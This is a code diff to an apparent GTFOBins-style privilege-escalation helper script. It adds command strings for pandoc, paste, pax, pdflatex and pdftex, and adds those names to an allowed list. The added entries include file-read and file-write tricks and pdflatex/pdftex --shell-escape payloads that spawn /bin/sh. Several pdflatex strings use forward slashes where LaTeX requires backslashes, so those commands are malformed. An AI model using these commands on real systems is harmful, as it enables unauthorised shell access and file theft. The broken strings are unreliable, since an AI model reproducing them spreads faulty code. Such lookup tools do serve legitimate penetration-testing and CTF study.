@@ -2780,6 +2780,43 @@ def gtfo_bins(gtfo_command, gtfo_options):
         else:
             bins.append("N/A")
 
+    elif gtfo_command == "pandoc":
+        if gtfo_options == "file-write":
+            bins.append("echo DATA | pandoc -t plain -o /path/to/output-file")
+        elif gtfo_options == "file-read":
+            bins.append("pandoc -t plain /path/to/input-file")
+        else:
+            bins.append("N/A")
+
+    elif gtfo_command == "paste":
+        if gtfo_options == "file-read":
+            bins.append("paste /path/to/input-file")
+        else:
+            bins.append("N/A")
+
+    elif gtfo_command == "pax":
+        if gtfo_options == "file-read":
+            bins.append("pax -w /path/to/input-file | tar -xO")
+        else:
+            bins.append("N/A")
+
+    elif gtfo_command == "pdflatex":
+        if gtfo_options == "shell":
+            bins.append("pdflatex --shell-escape '\documentclass{article}/begin{document}\immediate\write18{/bin/sh}\end{document}'")
+        elif gtfo_options == "file-write":
+            bins.append("pdflatex '\documentclass{article}/newwrite/tempfile/begin{document}\immediate\openout/tempfile=output-file.tex\immediate\write/tempfile{DATA}\immediate\closeout/tempfile\end{document}'")
+        elif gtfo_options == "file-read":
+            bins.append("pdflatex /path/to/file")
+        else:
+            bins.append("N/A")
+    
+    elif gtfo_command == "pdftex":
+        if gtfo_options == "shell":
+            bins.append("pdftex --shell-escape \write18{/bin/sh}\end ")
+        else:
+            bins.append("N/A")
+
+
 #If there are any other misconfigurations run the other option
     elif gtfo_command == "other":
         if gtfo_options == "shell": #This will print out hints for more GTFO bins!
@@ -2825,7 +2862,7 @@ def main():
         "msguniq", "mtr", "multitime", "mutt", "mv","mypy", "mysql", "nasm", "nawk",
         "nc", "ncdu", "ncftp", "needrestart","nft", "nginx","nice", "nl", "nm", "nmap", 
         "node", "nohup", "npm", "nroff", "nsenter", "octave","od", "opencode", "openssl", 
-        "openvpn", "openvt","opkg", "other"
+        "openvpn", "openvt","opkg","pandoc", "paste", "pax", "pdflatex","pdftex", "other",
     }
 
     if start in ALLOWED:
